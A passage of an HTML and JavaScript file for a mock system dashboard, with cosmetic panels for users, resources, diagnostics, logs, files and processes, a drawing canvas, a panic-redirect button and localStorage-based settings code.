              <button>Delete Selected</button>
              <button>Refresh List</button>
          </div>
          <div class="user-list" id="userList">
              <div class="user-item admin">
                  <div><span class="user-name">Administrator</span> <span class="user-role">(Admin)</span></div>
                  <div class="user-actions"><button>🔧</button><button>🗑️</button></div>
              </div>
              <div class="user-item user">
                  <div><span class="user-name">Beta.user</span> <span class="user-role">(User)</span></div>
                  <div class="user-actions"><button>🔧</button><button>🗑️</button></div>
              </div>
              <div class="user-item user">
                  <div><span class="user-name">GuestAccount</span> <span class="user-role">(Guest)</span></div>
                  <div class="user-actions"><button>🔧</button><button>🗑️</button></div>
              </div>
              <div class="user-item admin">
                  <div><span class="user-name">System.Core</span> <span class="user-role">(Admin)</span></div>
                  <div class="user-actions"><button>🔧</button><button>🗑️</button></div>
              </div>
              <div class="user-item user">
                  <div><span class="user-name">ResearchUser</span> <span class="user-role">(User)</span></div>
                  <div class="user-actions"><button>🔧</button><button>🗑️</button></div>
              </div>
          </div>
      </div>

      <!-- Communication Hub Panel -->
      <div id="communicationHubPanel" class="info-panel communication-hub-panel">
          <h2>✉️ Communication Hub</h2>
          <div class="hub-links">
              <a href="#" target="_blank">Internal Mail System</a>
              <a href="#" target="_blank">Secure Messaging Platform</a>
              <a href="#" target="_blank">Team Collaboration Tool</a>
              <a href="#" target="_blank">Public Announcement Channel</a>
              <a href="#" target="_blank">Departmental Chat</a>
              <a href="#" target="_blank">Emergency Broadcast System</a>
          </div>
      </div>

      <!-- System Config Panel -->
      <div id="systemConfigPanel" class="info-panel system-config-panel">
          <h2>⚙️ System Configuration</h2>
          <div class="config-section">
              <h4>Appearance Settings</h4>
              <div class="config-item">
                  <label for="configTheme">Theme:</label>
                  <div class="button-group">
                      <button class="active">Dark</button> <button>Light</button>
                  </div>
              </div>
              <div class="config-item">
                  <label for="configFontSize">Font Size:</label>
                  <input type="range" id="configFontSize" min="0.8" max="1.5" step="0.1" value="1.1">
                  <span class="range-label">1.1x</span>
              </div>
              <div class="config-item">
                  <label for="configAccentColor">Accent Color:</label>
                  <input type="color" id="configAccentColor" value="#ff914d">
              </div>
          </div>
          <div class="config-section">
              <h4>Notification Preferences</h4>
              <div class="config-item">
                  <label for="configNotifyToast">Toast Notifications:</label>
                  <input type="checkbox" id="configNotifyToast" checked>
              </div>
              <div class="config-item">
                  <label for="configNotifySound">Notification Sounds:</label>
                  <input type="checkbox" id="configNotifySound">
              </div>
              <div class="config-item">
                  <label for="configNotifyTimeout">Toast Duration (s):</label>
                  <input type="number" id="configNotifyTimeout" value="4" min="1" max="10">
              </div>
          </div>
          <div class="config-section">
              <h4>System Parameters</h4>
              <div class="config-item">
                  <label for="configHostname">Hostname:</label>
                  <input type="text" id="configHostname" value="PrivateSys-01">
              </div>
              <div class="config-item">
                  <label for="configDomain">Domain:</label>
                  <input type="text" id="configDomain" value="privatesys.local">
              </div>
              <div class="config-item">
                  <label for="configAutoLogin">Auto Login (Debug):</label>
                  <input type="checkbox" id="configAutoLogin">
              </div>
          </div>
      </div>

      <!-- Resource Allocator Panel -->
      <div id="resourceAllocatorPanel" class="info-panel resource-allocator-panel">
          <h2>⚡ Resource Allocation Control</h2>
          <div class="resource-item">
              <label>CPU Priority:</label>
              <div class="slider-container">
                  <input type="range" min="0" max="100" value="50" class="slider" id="cpuPriority">
                  <span class="value">50%</span>
              </div>
          </div>
          <div class="resource-item">
              <label>Memory Allocation:</label>
              <div class="slider-container">
                  <input type="range" min="0" max="100" value="75" class="slider" id="memAllocation">
                  <span class="value">75%</span>
              </div>
          </div>
          <div class="resource-item">
              <label>Network Bandwidth:</label>
              <div class="slider-container">
                  <input type="range" min="0" max="100" value="80" class="slider" id="netBandwidth">
                  <span class="value">80%</span>
              </div>
          </div>
          <div class="resource-item">
              <label>Disk I/O Throttling:</label>
              <div class="slider-container">
                  <input type="range" min="0" max="100" value="30" class="slider" id="diskIO">
                  <span class="value">30%</span>
              </div>
          </div>
          <div class="resource-item">
              <label>Process Limit:</label>
              <div class="slider-container">
                  <input type="range" min="10" max="500" value="200" class="slider" id="processLimit">
                  <span class="value">200</span>
              </div>
          </div>
      </div>

      <!-- Diagnostic Tools Panel -->
      <div id="diagnosticToolsPanel" class="info-panel diagnostic-tools-panel">
          <h2>🔍 System Diagnostic Tools</h2>
          <div class="tools-list">
              <button class="tool-button" onclick="dashboard.runDiagnostic('ping')">Ping Test</button>
              <button class="tool-button" onclick="dashboard.runDiagnostic('traceroute')">Traceroute</button>
              <button class="tool-button" onclick="dashboard.runDiagnostic('diskcheck')">Disk Check</button>
              <button class="tool-button" onclick="dashboard.runDiagnostic('memtest')">Memory Test</button>
              <button class="tool-button" onclick="dashboard.runDiagnostic('cpuStress')">CPU Stress Test</button>
              <button class="tool-button" onclick="dashboard.runDiagnostic('networkSpeed')">Network Speed Test</button>
          </div>
          <div class="tool-results" id="diagnosticResults">
              <p>Diagnostic results will be displayed here...</p>
          </div>
      </div>

      <!-- AI Assistant Panel -->
      <div id="aiAssistantPanel" class="info-panel ai-assistant-panel">
          <h2>🤖 AI Assistant Interface</h2>
          <div class="chat-container" id="chatContainer">
              <div class="assistant-message">Hello! How can I assist you today?</div>
          </div>
          <div class="input-area">
              <input type="text" id="aiInput" placeholder="Ask me anything..." autocomplete="off" />
              <button id="aiSendBtn">Send</button>
          </div>
      </div>

      <!-- Log Viewer Panel -->
      <div id="logViewerPanel" class="info-panel log-viewer-panel">
          <h2>📜 System Log Viewer</h2>
          <div class="log-controls">
              <button id="startLoggingBtn">Start Logging</button>
              <button id="stopLoggingBtn">Stop Logging</button>
              <button id="clearLogBtn">Clear Log</button>
              <select id="logLevelFilter">
                  <option value="all">All Levels</option>
                  <option value="info">Info</option>
                  <option value="warn">Warning</option>
                  <option value="error">Error</option>
              </select>
          </div>
          <div class="log-entries" id="logEntries">
              <!-- Log entries will appear here -->
          </div>
      </div>

      <!-- File Manager Panel -->
      <div id="fileManagerPanel" class="info-panel file-manager-panel">
          <h2>📂 File Management System</h2>
          <div class="fm-container">
              <div class="file-tree" id="fileTree">
                  <div><i class="folder-icon">📁</i> <span class="folder-name">Root</span></div>
                  <div style="margin-left: 20px;">
                      <div><i class="folder-icon">📁</i> <span class="folder-name">System</span></div>
                      <div style="margin-left: 20px;">
                          <div><i class="file-icon">📄</i> <span class="file-name">config.sys</span></div>
                          <div><i class="file-icon">📄</i> <span class="file-name">kernel.dll</span></div>
                      </div>
                  </div>
                  <div style="margin-left: 20px;">
                      <div><i class="folder-icon">📁</i> <span class="folder-name">Users</span></div>
                      <div style="margin-left: 20px;">
                          <div><i class="folder-icon">📁</i> <span class="folder-name">Admin</span></div>
                          <div style="margin-left: 20px;">
                              <div><i class="file-icon">📄</i> <span class="file-name">profile.dat</span></div>
                          </div>
                      </div>
                  </div>
              </div>
              <div class="file-list" id="fileList">
                  <div class="file-item folder"><i class="folder-icon">📁</i> <span class="folder-name">Root</span></div>
                  <div class="file-item folder"><i class="folder-icon">📁</i> <span class="folder-name">System</span></div>
                  <div class="file-item file"><i class="file-icon">📄</i> <span class="file-name">config.sys</span></div>
                  <div class="file-item file"><i class="file-icon">📄</i> <span class="file-name">kernel.dll</span></div>
              </div>
          </div>
      </div>

      <!-- Process Viewer Panel -->
      <div id="processViewerPanel" class="info-panel process-viewer-panel">
          <h2>🖥️ Process Viewer</h2>
          <div class="process-table-wrapper">
              <table class="process-table">
                  <thead>
                      <tr>
                          <th>Process Name</th>
                          <th>PID</th>
                          <th>CPU %</th>
                          <th>Memory</th>
                          <th>Status</th>
                          <th>Actions</th>
                      </tr>
                  </thead>
                  <tbody id="processTableBody">
                      <!-- Processes will be listed here -->
                      <tr class="process-item">
                          <td><span class="process-name">System Kernel</span></td>
                          <td>1</td>
                          <td>15.5%</td>
                          <td>120 MB</td>
                          <td>Running</td>
                          <td><button>Terminate</button></td>
                      </tr>
                      <tr class="process-item">
                          <td><span class="process-name">Dashboard GUI</span></td>
                          <td>1024</td>
                          <td>8.2%</td>
                          <td>85 MB</td>
                          <td>Running</td>
                          <td><button>Terminate</button></td>
                      </tr>
                      <tr class="process-item">
                          <td><span class="process-name">AI Assistant</span></td>
                          <td>2048</td>
                          <td>2.1%</td>
                          <td>40 MB</td>
                          <td>Running</td>
                          <td><button>Terminate</button></td>
                      </tr>
                  </tbody>
              </table>
          </div>
          <div class="process-actions">
              <button>Refresh Processes</button>
              <button>Show System Processes</button>
          </div>
      </div>
      
      <!-- Reminder Section (as a panel) -->
      <div id="reminderSection" class="info-panel">
          <h2>🔔 My Reminders</h2>
          <div class="reminder-input-group">
              <input type="text" id="newReminderInput" placeholder="Add a new reminder..." />
              <button id="addReminderBtn">Add</button>
          </div>
          <ul class="reminder-list" id="reminderList">
              <!-- Reminders will be added here by JS -->
          </ul>
      </div>

    </div> <!-- End of infoPanelsContainer -->

    <!-- Notes Canvas Container -->
    <div id="canvasContainer">
      <h2>🖌️ Quick Notes Canvas</h2>
      <canvas id="notesCanvas" width="800" height="450"></canvas> <!-- Larger canvas -->
      <div id="canvasControls">
        <button id="clearCanvasBtn">Clear Canvas</button>
        <button id="closeCanvasBtn">Close Notes</button>
      </div>
    </div>
    
    <!-- Zoom Controls -->
    <div class="zoom-controls">
        <button id="zoomOutBtn" title="Zoom Out">-</button>
        <button id="zoomInBtn" title="Zoom In">+</button>
    </div>
    
  </div> <!-- End of Dashboard -->

  <!-- Notifications Container -->
  <div id="notification-container"></div>

  <!-- Settings Modal -->
  <div id="settingsOverlay" class="settings-overlay"></div>
  <div id="settingsModal" class="settings-modal">
      <span class="close-settings-btn" id="closeSettingsBtn">&times;</span>
      <h2>System Settings</h2>
      
      <div class="setting-group">
          <h3>Appearance</h3>
          <label>
              <input type="checkbox" id="settingsThemeToggle"> Enable Light Theme
          </label>
          <label>
              Font Size: 
              <input type="range" id="settingsFontSize" min="0.8" max="1.5" step="0.1" value="1.1">
              <span id="settingsFontSizeValue">1.1x</span>
          </label>
          <label>
              Accent Color: 
              <input type="color" id="settingsAccentColor" value="#ff914d">
          </label>
          <label>
              Background Style: 
              <select id="settingsBackgroundStyle">
                  <option value="gradient">Gradient</option>
                  <option value="solid">Solid</option>
                  <option value="pattern">Pattern (Future)</option>
              </select>
          </label>
      </div>
      
      <div class="setting-group">
          <h3>Notifications</h3>
          <label>
              <input type="checkbox" id="settingsNotifyEnabled" checked> Enable System Notifications
          </label>
          <label>
              Notification Timeout (seconds):
              <input type="number" id="settingsNotifyTimeout" value="4" min="1" max="10">
          </label>
          <label>
              <input type="checkbox" id="settingsNotifySound"> Play Notification Sounds
          </label>
      </div>
      
      <div class="setting-group">
          <h3>Dashboard Features</h3>
          <label>
              <input type="checkbox" id="settingsShowAnnouncements" checked> Show Announcement Bar
          </label>
          <label>
              <input type="checkbox" id="settingsShowMotivation" checked> Show Motivation Box
          </label>
          <label>
              <input type="checkbox" id="settingsAutoThemeBasedOnTime"> Auto Theme (Day/Night)
          </label>
      </div>

      <div class="setting-group">
          <h3>System Behavior</h3>
          <label>
              <input type="checkbox" id="settingsPanicButtonBehavior"> Open Panic Button in New Tab
          </label>
          <label>
              Confirm Restart: 
              <select id="settingsConfirmRestart">
                  <option value="always">Always</option>
                  <option value="warn">Show Warning</option>
                  <option value="never">Never</option>
              </select>
          </label>
          <label>
              <input type="checkbox" id="settingsEnableAutoSave"> Enable Auto-Save for Notes
          </label>
      </div>
      
      <div class="setting-group">
          <h3>Advanced</h3>
          <label>
              <input type="checkbox" id="settingsDebugMode"> Enable Debug Mode
          </label>
          <label>
              Log Level: 
              <select id="settingsLogLevel">
                  <option value="verbose">Verbose</option>
                  <option value="info">Info</option>
                  <option value="warn">Warning</option>
                  <option value="error">Error</option>
              </select>
          </label>
      </div>
      
  </div>

  <script>
    // LOADER SCRIPT (runs first)
    (function() {
        const loader = document.getElementById('loader');
        const loginBox = document.getElementById('loginBox');
        const loaderStages = loader.querySelectorAll('.loader-stage');

        const animationDuration = 1000; // ms for each stage animation
        const staggerDelay = 500; // ms between stages

        const showStage = (stageIndex) => {
            if (stageIndex >= loaderStages.length) {
                // All stages done, transition to login
                loader.style.animation = `fadeOut 0.8s ease-out forwards`;
                loader.addEventListener('animationend', () => {
                    loader.style.display = 'none';
                    loginBox.style.display = 'block'; // Show login box
                    document.body.classList.add('login-body'); // Add login body class
                }, { once: true });
                return;
            }

            const currentStage = loaderStages[stageIndex];
            currentStage.style.display = 'block';
            // Apply animation only after element is displayed
            requestAnimationFrame(() => {
                currentStage.style.animation = `fadeInSlideUp ${animationDuration}ms forwards`;
            });

            setTimeout(() => {
                currentStage.style.animation = `fadeOut ${animationDuration}ms forwards`; // Fade out current stage after showing
                setTimeout(() => {
                    currentStage.style.display = 'none'; // Hide it before next stage anim starts
                    showStage(stageIndex + 1); // Move to the next stage
                }, animationDuration);
            }, animationDuration + staggerDelay); // Delay before moving to next stage
        };

        // Start the loader sequence
        showStage(0);
    })();

    // --- Global Dashboard Functionality ---
    const dashboard = {
      isDashboardInitialized: false, // Flag to prevent re-initialization

      // Initialize all dashboard functionality
      init: function() {
        if (this.isDashboardInitialized) return; // Prevent double initialization

        this.initSessionTimer();
        this.initClock();
        this.generateCalendar();
        this.initThemeToggle();
        this.initButtons();
        this.initCanvas();
        this.initPanels();
        this.initQuickBar();
        this.initSettingsModal();
        this.initReminderSystem();
        this.initSystemMonitor();
        this.initNetworkScanner();
        this.initSecuritySuite();
        this.initUserManager();
        this.initLogViewer();
        this.initFileExplorer();
        this.initProcessViewer();
        this.initAI();
        // ... init other new panels ...

        this.isDashboardInitialized = true;
        console.log("Dashboard Initialized.");
      },
      
      // --- Core Dashboard Features ---
      initSessionTimer: function() {
        let sessionSeconds = 0;
        const sessionTimeElement = document.getElementById('sessionTime');
        
        function formatTime(seconds) {
          const hrs = String(Math.floor(seconds / 3600)).padStart(2, '0');
          const mins = String(Math.floor((seconds % 3600) / 60)).padStart(2, '0');
          const secs = String(seconds % 60).padStart(2, '0');
          return `${hrs}:${mins}:${secs}`;
        }
        
        function updateSessionTime() {
          sessionSeconds++;
          sessionTimeElement.innerText = `⏳ Session Time: ${formatTime(sessionSeconds)}`;
        }
        
        this.sessionTimerInterval = setInterval(updateSessionTime, 1000); // Store interval ID
      },
      
      initClock: function() {
        const realTimeClockElement = document.getElementById('realTimeClock');
        const realDateElement = document.getElementById('realDate');
        
        function updateClock() {
          const now = new Date();
          const timeStr = now.toLocaleTimeString(undefined, { hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true });
          const dateStr = now.toLocaleDateString(undefined, { month: 'short', day: 'numeric', year: 'numeric' }); // Short month for brevity

          realTimeClockElement.innerText = '🕒 ' + timeStr;
          realDateElement.innerText = '📅 ' + dateStr;
        }
        
        updateClock();
        this.clockInterval = setInterval(updateClock, 1000);
      },
      
      generateCalendar: function() {
        const calendar = document.getElementById('calendar');
        calendar.innerHTML = ''; 
        const days = ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'];
        days.forEach(day => {
          const div = document.createElement('div');
          div.innerText = day;
          calendar.appendChild(div);
        });

        const date = new Date();
        const year = date.getFullYear();
        const month = date.getMonth();
        const today = date.getDate();

        const firstDayOfMonth = new Date(year, month, 1);
        const startingDayOfWeek = firstDayOfMonth.getDay();
        const daysInMonth = new Date(year, month + 1, 0).getDate();

        for (let i = 0; i < startingDayOfWeek; i++) {
          const emptyCell = document.createElement('div');
          calendar.appendChild(emptyCell);
        }

        for (let day = 1; day <= daysInMonth; day++) {
          const cell = document.createElement('div');
          cell.innerText = day;
          if (day === today) {
              cell.classList.add('today');
          }
          calendar.appendChild(cell);
        }
      },
      
      initThemeToggle: function() {
        const themeBtn = document.getElementById('themeToggle');
        const body = document.body;
        
        // Check for saved theme preference
        const savedTheme = localStorage.getItem('dashboardTheme');
        if (savedTheme === 'light') {
            body.classList.add('light-theme');
            themeBtn.innerText = '🌙 Dark Mode';
        } else {
            themeBtn.innerText = '☀️ Light Mode';
        }

        themeBtn.addEventListener('click', () => {
          body.classList.toggle('light-theme');
          if (body.classList.contains('light-theme')) {
            themeBtn.innerText = '🌙 Dark Mode';
            localStorage.setItem('dashboardTheme', 'light');
          } else {
            themeBtn.innerText = '☀️ Light Mode';
            localStorage.setItem('dashboardTheme', 'dark');
          }
        });
      },
      
      initButtons: function() {
        // Panic Button
        document.getElementById('panicBtn').addEventListener('click', () => {
          const settings = this.loadSettings(); // Get settings
          if (settings.panicButtonBehavior) {
            window.open('https://clever.com', '_blank'); // Open in new tab if setting enabled
          } else {
            window.location.href = 'https://clever.com'; // Default behavior
          }
        });

        // Restart Button
        document.getElementById('restartBtn').addEventListener('click', () => {
          const settings = this.loadSettings();
          let confirmMessage = 'Are you sure you want to restart the dashboard?';
          if (settings.confirmRestart === 'warn') {
              confirmMessage = 'Restarting will close the current session. Continue?';
          } else if (settings.confirmRestart === 'never') {
              confirmMessage = ''; // No confirmation needed
          }

          if (!confirmMessage || confirm(confirmMessage)) {
            // Simulate page kill
            const messageElement = document.createElement('div');
            messageElement.style.cssText = `
              display:flex; justify-content:center; align-items:center; 
              height:100vh; background:#1a1a1a; color:#f9f2dc; 
              font-family:'Montserrat', sans-serif; font-size:24px; text-align:center;
              padding: 30px; box-shadow: inset 0 0 25px rgba(255, 76, 76, 0.7);
            `;
            messageElement.textContent = 'Dashboard has been reset. Please reload the page to continue.';
            document.body.innerHTML = ''; // Clear body
            document.body.appendChild(messageElement);
            // In a real scenario, this would reload the page or kill the process.
            // For demonstration, we just display a message.
          }
        });

        // Fix Issues Button
        document.getElementById('fixIssuesBtn').addEventListener('click', () => {
          this.showNotification('Running system diagnostics... This may take a moment.', 'info');
          setTimeout(() => {
            this.showNotification('Diagnostics complete. No critical issues found. System operating normally.', 'success');
          }, 2000);
        });
        
        // Full Screen Button
        const fullScreenBtn = document.getElementById('fullScreenBtn');
        fullScreenBtn.addEventListener('click', () => {
          if (!document.fullscreenElement) {
            document.documentElement.requestFullscreen().catch(err => {
              this.showNotification(`Error entering fullscreen: ${err.message}`, 'error');
            });
            fullScreenBtn.innerText = 'Exit Full Screen'; // Change button text
          } else {
            document.exitFullscreen();
            fullScreenBtn.innerText = '🖥️ Full Screen'; // Revert button text
          }
        });
        
        // Zoom Controls
        let currentZoom = 1.0;
        const zoomStep = 0.1;
        const minZoom = 0.7;
        const maxZoom = 1.5;
        
        document.getElementById('zoomInBtn').addEventListener('click', () => {
          if (currentZoom < maxZoom) {
            currentZoom += zoomStep;
            document.body.style.zoom = currentZoom;
            document.getElementById('zoomInBtn').style.boxShadow = '0 0 10px rgba(255, 145, 77, 0.4)';
            setTimeout(() => document.getElementById('zoomInBtn').style.boxShadow = '', 200);
          }
        });

        document.getElementById('zoomOutBtn').addEventListener('click', () => {
          if (currentZoom > minZoom) {
            currentZoom -= zoomStep;
            document.body.style.zoom = currentZoom;
            document.getElementById('zoomOutBtn').style.boxShadow = '0 0 10px rgba(255, 145, 77, 0.4)';
            setTimeout(() => document.getElementById('zoomOutBtn').style.boxShadow = '', 200);
          }
        });
      },
      
      // --- Canvas/Notes Functionality ---
      initCanvas: function() {
        const notesBtn = document.getElementById('notesBtn');
        const canvasContainer = document.getElementById('canvasContainer');
        const mainGrid = document.getElementById('mainGrid');
        const announcementBar = document.getElementById('announcementBar');
        const quickBar = document.querySelector('.quick-bar');
        const mainControlsBar = document.querySelector('.main-controls-bar');
        const dashboardHeader = document.getElementById('dashboardHeader');

        const toggleCanvasView = (show) => {
            const displayStyle = show ? 'block' : 'flex';
            const toggleBtn = document.getElementById('toggleSectionsBtn');
            
            mainGrid.style.display = show ? 'none' : displayStyle;
            canvasContainer.style.display = show ? displayStyle : 'none';
            announcementBar.style.display = show ? 'none' : '';
            quickBar.style.display = show ? 'none' : '';
            mainControlsBar.style.display = show ? 'none' : '';
            dashboardHeader.style.display = show ? 'none' : '';
            
            toggleBtn.innerText = show ? '⬇️ Show Sections' : '⬆️ Toggle Sections';
            toggleBtn.style.backgroundColor = show ? '#ff6666' : '#ff914d'; // Red when canvas is shown
        };

        notesBtn.addEventListener('click', () => {
            toggleCanvasView(true);
        });

        document.getElementById('closeCanvasBtn').addEventListener('click', () => {
            toggleCanvasView(false);
        });

        document.getElementById('clearCanvasBtn').addEventListener('click', () => {
          const canvas = document.getElementById('notesCanvas');
          const ctx = canvas.getContext('2d');
          ctx.clearRect(0, 0, canvas.width, canvas.height);
          ctx.fillStyle = '#1e1e1e'; // Dark background
          ctx.fillRect(0, 0, canvas.width, canvas.height);
          this.showNotification('Notes cleared.', 'info');
        });

        const canvas = document.getElementById('notesCanvas');
        const ctx = canvas.getContext('2d');
        
        // Set initial canvas background
        ctx.fillStyle = '#1e1e1e'; // Dark background for notes
        ctx.fillRect(0, 0, canvas.width, canvas.height);

        let drawing = false;
        let lastPos = { x: 0, y: 0 };
        const canvasColor = '#ff914d'; // Default drawing color
        const lineWidth = 3;

        function getMousePos(canvas, evt) {
          const rect = canvas.getBoundingClientRect();
          return {
            x: (evt.clientX || evt.touches[0].clientX) - rect.left,
            y: (evt.clientY || evt.touches[0].clientY) - rect.top
          };
        }

        const startDrawing = (e) => {
          drawing = true;
          lastPos = getMousePos(canvas, e);
          ctx.beginPath();
          ctx.moveTo(lastPos.x, lastPos.y);
          e.preventDefault();
        };

        const draw = (e) => {
          if (!drawing) return;
          const pos = getMousePos(canvas, e);
          ctx.lineTo(pos.x, pos.y);
          ctx.strokeStyle = canvasColor;
          ctx.lineWidth = lineWidth;
          ctx.lineCap = 'round';
          ctx.stroke();
          lastPos = pos;
          e.preventDefault();
        };

        const stopDrawing = () => {
          drawing = false;
          if (document.getElementById('screenshotBtn').clickEvent) { // Check for simulated click event
             document.getElementById('screenshotBtn').clickEvent = false; // Reset event flag
          }
        };

        // Mouse events
        canvas.addEventListener('mousedown', startDrawing);
        canvas.addEventListener('mousemove', draw);
        canvas.addEventListener('mouseup', stopDrawing);
        canvas.addEventListener('mouseleave', stopDrawing); // Stop drawing if mouse leaves canvas

        // Touch events
        canvas.addEventListener('touchstart', startDrawing);
        canvas.addEventListener('touchmove', draw);
        canvas.addEventListener('touchend', stopDrawing);
        canvas.addEventListener('touchcancel', stopDrawing);

        // Screenshot Button
        document.getElementById('screenshotBtn').addEventListener('click', () => {
          const elementToCapture = document.body; 
          this.showNotification('Taking screenshot...', 'info');
          html2canvas(elementToCapture, { useCORS: true }).then(canvasImg => {
            const link = document.createElement('a');
            link.download = `dashboard_screenshot_${Date.now()}.png`;
            link.href = canvasImg.toDataURL('image/png');
            link.click();
            this.showNotification('Screenshot saved.', 'success');
          }).catch(err => {
            this.showNotification(`Screenshot failed: ${err.message}`, 'error');
          });
        });
        
        // Export Notes Button
        document.getElementById('exportNotesBtn').addEventListener('click', () => {
          const link = document.createElement('a');
          link.download = `notes_canvas_${Date.now()}.png`;
          link.href = canvas.toDataURL('image/png');
          link.click();
          this.showNotification('Notes saved as image.', 'success');
        });

        // Toggle Sections Button
        document.getElementById('toggleSectionsBtn').addEventListener('click', () => {
            const isCanvasVisible = canvasContainer.style.display === 'block';
            toggleCanvasView(!isCanvasVisible);
        });
      },
      
      // --- Panel Management ---
      initPanels: function() {
        // Ensure all panels are hidden initially
        document.querySelectorAll('.info-panel').forEach(panel => panel.style.display = 'none');
        document.querySelectorAll('.ipad-content').forEach(content => content.style.display = 'none');
        document.querySelectorAll('.bypass-content').forEach(content => content.style.display = 'none');
        // Hide specific new panel content sections as well
        document.getElementById('settingsModal').style.display = 'none';
        document.getElementById('settingsOverlay').style.display = 'none';
        document.getElementById('reminderSection').style.display = 'none';
      },
      
      // General toggle for panels that use .info-panel class
      togglePanel: function(panelId) {
        const panel = document.getElementById(panelId);
        const isVisible = panel.style.display === 'block';
        
        // Hide all other panels of the same type first if needed
        // For simplicity here, we just toggle the specified panel
        
        panel.style.display = isVisible ? 'none' : 'block';
        
        // Update button styles if needed (e.g., to show active state)
      },
      
      // Specific toggles for sub-panels
      showIpadContent: function(contentId) {
        document.querySelectorAll('.ipad-content').forEach(content => content.style.display = 'none');
        const targetContent = document.getElementById('ipad' + contentId.charAt(0).toUpperCase() + contentId.slice(1));
        if (targetContent) targetContent.style.display = 'block';
      },
      
      showBypassContent: function(contentId) {
        document.querySelectorAll('.bypass-content').forEach(content => content.style.display = 'none');
        const targetContent = document.getElementById(contentId + 'Bypass');
        if (targetContent) targetContent.style.display = 'block';
      },

      // --- Notification System ---
      showNotification: function(message, type = 'info') {
        const container = document.getElementById('notification-container');
        const toast = document.createElement('div');
        toast.className = `toast ${type}`;
        
        let icon = '';
        switch(type) {
            case 'success': icon = '✅'; break;
            case 'error': icon = '❌'; break;
            case 'info': icon = 'ℹ️'; break;
            case 'warn': icon = '⚠️'; break;
        }

        toast.textContent = icon + ' ' + message;
        container.prepend(toast); // Add to the beginning of the container

        const settings = this.loadSettings();
        const timeout = (settings.notifyTimeout || 4) * 1000; // Get timeout from settings

        if (settings.notifyEnabled && settings.notifySound) {
            // Play a simple sound effect (requires an Audio element or similar)
            // For demonstration, we'll just log that a sound would play.
            console.log(`Playing sound for notification type: ${type}`);
            // Example: new Audio('path/to/sound.mp3').play();
        }

        // Remove toast after timeout
        setTimeout(() => {
          toast.style.animation = `toastOut 0.5s forwards`;
          toast.addEventListener('animationend', () => {
            toast.remove();
          }, { once: true });
        }, timeout);
      },

      // --- Settings Modal Logic ---
      initSettingsModal: function() {
        const settingsBtn = document.getElementById('settingsBtn');
        const closeSettingsBtn = document.getElementById('closeSettingsBtn');
        const settingsOverlay = document.getElementById('settingsOverlay');
        const settingsModal = document.getElementById('settingsModal');
        
        const body = document.body; // Reference to the body element

        const openSettings = () => {
            settingsModal.style.display = 'block';
            settingsOverlay.style.display = 'block';
            this.loadSettingsIntoUI(); // Populate UI with current settings
            
            // Pause main dashboard animations if necessary
            // For now, just ensure it's visible
        };

        const closeSettings = () => {
            settingsModal.style.display = 'none';
            settingsOverlay.style.display = 'none';
            
            // Resume dashboard animations/activities if paused
        };

        settingsBtn.addEventListener('click', openSettings);
        closeSettingsBtn.addEventListener('click', closeSettings);
        settingsOverlay.addEventListener('click', closeSettings); // Close by clicking overlay

        // Save settings when changes are made
        settingsModal.addEventListener('change', (e) => {
            // Find the nearest label or input that controls a setting
            const targetInput = e.target;
            if (targetInput.id) { // Only process if the element has an ID
                this.saveSetting(targetInput.id, targetInput.type === 'checkbox' ? targetInput.checked : targetInput.value);
                this.applySetting(targetInput.id, targetInput.value); // Apply setting immediately
            }
        });
        
        // Special handler for color input to trigger change event
        const accentColorInput = document.getElementById('settingsAccentColor');
        accentColorInput.addEventListener('input', () => { // Use 'input' for real-time update
            this.saveSetting(accentColorInput.id, accentColorInput.value);
            this.applySetting(accentColorInput.id, accentColorInput.value);
        });
        
        // Special handler for range input to update value display
        const fontSizeInput = document.getElementById('settingsFontSize');
        const fontSizeValueDisplay = document.getElementById('settingsFontSizeValue');
        fontSizeInput.addEventListener('input', () => {
            const value = parseFloat(fontSizeInput.value).toFixed(1);
            fontSizeValueDisplay.textContent = `${value}x`;
            this.saveSetting(fontSizeInput.id, value);
            this.applySetting(fontSizeInput.id, value);
        });
      },

      // Settings persistence (using localStorage)
      loadSettings: function() {
        const defaultSettings = {
          dashboardTheme: 'dark',
          settingsThemeToggle: false,
          settingsFontSize: 1.1,
          settingsAccentColor: '#ff914d',
          settingsBackgroundStyle: 'gradient',
          settingsNotifyEnabled: true,
          settingsNotifyTimeout: 4,
          settingsNotifySound: false,
          settingsShowAnnouncements: true,
          settingsShowMotivation: true,
          settingsAutoThemeBasedOnTime: false,
          settingsPanicButtonBehavior: false,
          settingsConfirmRestart: 'warn',
          settingsEnableAutoSave: true,
          settingsDebugMode: false,
          settingsLogLevel: 'info',
        };
        const savedSettings = localStorage.getItem('dashboardSettings');
        return savedSettings ? { ...defaultSettings, ...JSON.parse(savedSettings) } : defaultSettings;
      },

      saveSetting: function(key, value) {
        let currentSettings = this.loadSettings();
        currentSettings[key] = value;
        localStorage.setItem('dashboardSettings', JSON.stringify(currentSettings));
      },

      // Apply settings to UI elements
      applySetting: function(key, value) {
          // Applies settings that can be changed dynamically without reload
          const body = document.body;
          const themeBtn = document.getElementById('themeToggle');
          const announcementBar = document.getElementById('announcementBar');
          const motivationBox = document.getElementById('motivationBox');

          switch (key) {
              case 'settingsThemeToggle':
                  if (value) {
                      body.classList.add('light-theme');
                      themeBtn.innerText = '🌙 Dark Mode';
                  } else {
                      body.classList.remove('light-theme');
                      themeBtn.innerText = '☀️ Light Mode';
                  }
                  break;
              case 'settingsFontSize':
                  document.body.style.fontSize = `${value}em`; // Applies to body, cascading down
                  // If directly applied to html or specific elements:
                  // document.documentElement.style.fontSize = `${value}em`;
                  break;
              case 'settingsAccentColor':
                  // This is complex, might need to update many CSS variables or specific elements
                  // For now, update a general element or log it
                  console.log('Accent color changed to:', value);
                  // Example: document.documentElement.style.setProperty('--primary-accent', value);
                  // If theme is light, also update the light theme accent
                  if (body.classList.contains('light-theme')) {
                      // Update light theme specific accent if it exists, otherwise use general
                  }
                  break;
              case 'settingsShowAnnouncements':
                  announcementBar.style.display = value ? '' : 'none';
                  break;
              case 'settingsShowMotivation':
                  motivationBox.style.display = value ? '' : 'none';
                  break;
              case 'settingsAutoThemeBasedOnTime':
                  // Logic to switch themes based on time would go here or in init
                  break;
              case 'settingsPanicButtonBehavior':
                  // Handled in initButtons
                  break;
              case 'settingsConfirmRestart':
                  // Handled in initButtons
                  break;
              case 'settingsNotifyEnabled':
                  // Logic to enable/disable notifications display
                  break;
              case 'settingsNotifySound':
                  // Logic to enable/disable notification sounds
                  break;
              case 'settingsNotifyTimeout':
                  // Affects how long toasts stay, handled in showNotification
                  break;
